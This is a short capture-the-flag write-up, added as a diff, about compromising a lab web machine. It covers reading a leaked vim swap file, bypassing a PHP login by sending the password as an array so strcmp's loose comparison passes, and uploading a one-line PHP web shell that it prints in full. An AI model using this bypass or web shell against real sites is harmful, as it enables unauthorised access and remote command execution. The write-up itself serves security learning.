@@ -1,0 +1,32 @@
+this was fairly simple, just a few steps to it.
+
+first you can use directory traversal in the login url to just go to the /login
+directory.
+
+here you can see 3 files, the .swp one you can download.
+you can use strings to check the .swp file for strings or
+you can use vim (!) to read this using the followng command
+
+vim -r login.php.swp
+
+here we can see a bit of php code that checks the username and password which is done
+using strcmp. using google and php docs we cam see there is a vuln here. it compares if == to 0
+not using 3 = so doent check types. because of how this workks "7 dogs" == 7 returns true and
+so on. 0 is equal to true,  so if we can use this vuln to return true, then we can login.
+
+If we pass in the password as an array eg: password[]='test' in the html request, it will return
+null.  due to the previously mentioned flaw, null == 0 = true.
+
+knowing this, using burpsuite, we can take the http request for login, send it to the repeater, add []
+to the end of password (before the =) and send it with any password (user admin) and we will get a 
+successful login.
+
+######## BASE WEBSITE ########
+
+now we are logged in, we only have one option on the admin page, fortunately, it is the ability to upload a file.
+i tried a more complicated reverse php shell first, but it didn't work so i ended up using a 'barebones' reverse shell
+script called shell.php containing:
+
+<?php system ($_GET['cmd']); ?>
+
+and that's all. this is the file i upload in the admin area.
